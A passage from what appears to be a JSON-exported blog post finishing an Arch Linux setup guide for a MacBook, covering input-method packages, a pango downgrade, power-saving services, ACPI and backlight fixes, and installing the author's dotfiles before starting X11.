fcitx5-material-color\nuser$ yay -S fcitx5-pinyin-zhwiki\n</code></pre>\n<p>Downgrade <code>pango</code> to 1.43 since &gt;= 1.44 cause issue with font rendering on rofi:</p>\n<pre><code>user$ sudo pacman -U https://archive.archlinux.org/packages/p/pango/pango-1.43.0-1-x86_64.pkg.tar.xz\n</code></pre>\n<p>Powersaving:</p>\n<pre><code>user$ yay -S powertop thermald cpupower mbpfan-git\nuser$ sudo systemctl enable thermald.service\nuser$ sudo systemctl enable cpupower.service\nuser$ sudo systemctl enable mbpfan.service\n</code></pre>\n<p>Finally, create systemd services that execute the following commands, respectively:</p>\n<ul>\n<li>echo ‘disable’ &gt; /sys/firmware/acpi/interrupts/gpe06  # fix kworker high cpu usage</li>\n<li>echo “XHC1” &gt; /proc/acpi/wakeup  # fix immediate wakeup after suspension on macbook</li>\n<li>setpci -v -H1 -s 00:01.00 BRIDGE_CONTROL=0  # enable keyboard backlight control</li>\n</ul>\n<h1 id=\"Enter-X11\"><a href=\"#Enter-X11\" class=\"headerlink\" title=\"Enter X11\"></a>Enter X11</h1><p>Install my dotfiles:</p>\n<pre><code>user$ git clone https://github.com/aesophor/dotfiles.git ~/Dots\nuser$ cd ~/Dots\nuser$ rm ~/.zshrc ~/.bashrc\nuser$ ./.install.sh\n</code></pre>\n<p>Start an X11 session (GUI) as your unprivileged user:</p>\n<pre><code>user$ startx\n</code></pre>\n<p>Voilà. Now you can go ahead and start customizing it!<br><img data-src=\"result.png\"></p>\n",
            "tags": [
                "linux"
            ]
        }
    ]
}